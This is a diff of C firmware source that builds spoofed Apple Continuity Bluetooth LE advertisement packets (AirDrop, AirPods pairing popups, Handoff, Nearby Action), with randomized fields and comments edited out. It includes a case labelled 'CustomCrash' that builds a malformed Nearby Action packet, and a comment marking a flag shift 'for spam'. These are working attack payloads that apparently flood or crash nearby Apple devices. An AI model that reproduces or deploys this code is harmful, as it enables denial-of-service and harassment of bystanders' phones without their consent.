@@ -1,10 +1,7 @@
 #include "continuity.h"
-#include <stdlib.h> // For rand()
-#include <esp_system.h> // For esp_fill_random()
-//#include <Arduino.h>
 #include <stdint.h>
+#include <stdlib.h> // For rand()
 
-// Define COUNT_OF if not provided elsewhere
 #ifndef COUNT_OF
 #define COUNT_OF(x) (sizeof(x) / sizeof((x)[0]))
 #endif
@@ -24,7 +21,7 @@ const char* continuity_get_type_name(ContinuityType type) {
     return continuity_type_names[type];
 }
 
-#define HEADER_LEN (6) // 1 Length + 1 Type + 2 Company ID + 1 Continuity Type + 1 Continuity Length
+#define HEADER_LEN (6)
 static uint8_t continuity_packet_sizes[ContinuityTypeCount] = {
     [ContinuityTypeAirDrop] = HEADER_LEN + 18,
     [ContinuityTypeProximityPair] = HEADER_LEN + 25,
@@ -44,17 +41,16 @@ void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
     uint8_t size = continuity_get_packet_size(msg->type);
     uint8_t i = 0;
 
-    packet[i++] = size - 1; // Packet Length (excludes length byte itself)
-    packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
-    packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.) low byte
-    packet[i++] = 0x00; // ... high byte
-    packet[i++] = msg->type; // Continuity Type
-    packet[i] = size - i - 1; // Continuity Length
+    packet[i++] = size - 1;
+    packet[i++] = 0xFF;
+    packet[i++] = 0x4C;
+    packet[i++] = 0x00;
+    packet[i++] = msg->type;
+    packet[i] = size - i - 1;
     i++;
 
     switch(msg->type) {
     case ContinuityTypeAirDrop:
-        packet[i++] = 0x00; // Zeros
         packet[i++] = 0x00;
         packet[i++] = 0x00;
         packet[i++] = 0x00;
@@ -62,47 +58,49 @@ void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
         packet[i++] = 0x00;
         packet[i++] = 0x00;
         packet[i++] = 0x00;
-        packet[i++] = 0x01; // Version
-        packet[i++] = (rand() % 256); // AppleID
+        packet[i++] = 0x00;
+        packet[i++] = 0x01;
         packet[i++] = (rand() % 256);
-        packet[i++] = (rand() % 256); // Phone Number
         packet[i++] = (rand() % 256);
-        packet[i++] = (rand() % 256); // Email
         packet[i++] = (rand() % 256);
-        packet[i++] = (rand() % 256); // Email2
         packet[i++] = (rand() % 256);
-        packet[i++] = 0x00; // Zero
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
+        packet[i++] = 0x00;
         break;
 
     case ContinuityTypeProximityPair:
-        packet[i++] = msg->data.proximity_pair.prefix; // Prefix (paired 0x01, new 0x07, airtag 0x05)
+        packet[i++] = msg->data.proximity_pair.prefix;
         packet[i++] = msg->data.proximity_pair.model >> 8;
         packet[i++] = msg->data.proximity_pair.model & 0xFF;
-        packet[i++] = 0x55; // Status
-        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
-        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charging Status and Battery Case Level
-        packet[i++] = (rand() % 256); // Lid Open Counter
-        packet[i++] = 0x00; // Device Color
+        packet[i++] = 0x55;
+        packet[i++] = ((rand() % 10) << 4) + (rand() % 10);
+        packet[i++] = ((rand() % 8) << 4) + (rand() % 10);
+        packet[i++] = (rand() % 256);
         packet[i++] = 0x00;
-        esp_fill_random(&packet[i], 16); // Encrypted Payload
-        i += 16;
+        packet[i++] = 0x00;
+        for (uint8_t j = 0; j < 16; j++) {
+            packet[i++] = rand() % 256;
+        }
         break;
 
     case ContinuityTypeAirplayTarget:
-        packet[i++] = (rand() % 256); // Flags
-        packet[i++] = (rand() % 256); // Configuration Seed
-        packet[i++] = (rand() % 256); // IPv4 Address
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
         break;
 
     case ContinuityTypeHandoff:
-        packet[i++] = 0x01; // Version
-        packet[i++] = (rand() % 256); // Initialization Vector
+        packet[i++] = 0x01;
         packet[i++] = (rand() % 256);
-        packet[i++] = (rand() % 256); // AES-GCM Auth Tag
-        packet[i++] = (rand() % 256); // Encrypted Payload
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
@@ -115,47 +113,48 @@ void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
         break;
 
     case ContinuityTypeTetheringSource:
-        packet[i++] = 0x01; // Version
-        packet[i++] = (rand() % 256); // Flags
-        packet[i++] = (rand() % 101); // Battery Life
-        packet[i++] = 0x00; // Cell Service Type
+        packet[i++] = 0x01;
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 101);
+        packet[i++] = 0x00;
         packet[i++] = (rand() % 8);
-        packet[i++] = (rand() % 5); // Cell Service Strength
+        packet[i++] = (rand() % 5);
         break;
 
     case ContinuityTypeNearbyAction:
-        packet[i] = msg->data.nearby_action.flags; // Action Flags
-        if(packet[i] == 0xBF && rand() % 2) packet[i]++; // Shift 0xBF-0xC0 for spam
+        packet[i] = msg->data.nearby_action.flags;
+        if(packet[i] == 0xBF && rand() % 2) packet[i]++;
         i++;
         packet[i++] = msg->data.nearby_action.type;
-        esp_fill_random(&packet[i], 3); // Authentication Tag
-        i += 3;
+        for (uint8_t j = 0; j < 3; j++) {
+            packet[i++] = rand() % 256;
+        }
         break;
 
     case ContinuityTypeNearbyInfo:
-        packet[i++] = ((rand() % 16) << 4) + (rand() % 16); // Status Flags and Action Code
-        packet[i++] = (rand() % 256); // Status Flags
-        packet[i++] = (rand() % 256); // Authentication Tag
+        packet[i++] = ((rand() % 16) << 4) + (rand() % 16);
+        packet[i++] = (rand() % 256);
+        packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
         packet[i++] = (rand() % 256);
         break;
 
     case ContinuityTypeCustomCrash:
-        i -= 2; // Override segment header
-        packet[i++] = ContinuityTypeNearbyAction; // Type
-        packet[i++] = 0x05; // Length
-        packet[i++] = 0xC1; // Action Flags
+        i -= 2;
+        packet[i++] = ContinuityTypeNearbyAction;
+        packet[i++] = 0x05;
+        packet[i++] = 0xC1;
         const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-        packet[i++] = types[rand() % COUNT_OF(types)]; // Action Type
-        esp_fill_random(&packet[i], 3); // Authentication Tag
-        i += 3;
-
-        packet[i++] = 0x00; // ???
-        packet[i++] = 0x00; // ???
-
-        packet[i++] = ContinuityTypeNearbyInfo; // Type ???
-        esp_fill_random(&packet[i], 3); // Shenanigans (Length + IDK) ???
-        i += 3;
+        packet[i++] = types[rand() % COUNT_OF(types)];
+        for (uint8_t j = 0; j < 3; j++) {
+            packet[i++] = rand() % 256;
+        }
+        packet[i++] = 0x00;
+        packet[i++] = 0x00;
+        packet[i++] = ContinuityTypeNearbyInfo;
+        for (uint8_t j = 0; j < 3; j++) {
+            packet[i++] = rand() % 256;
+        }
         break;
 
     default:
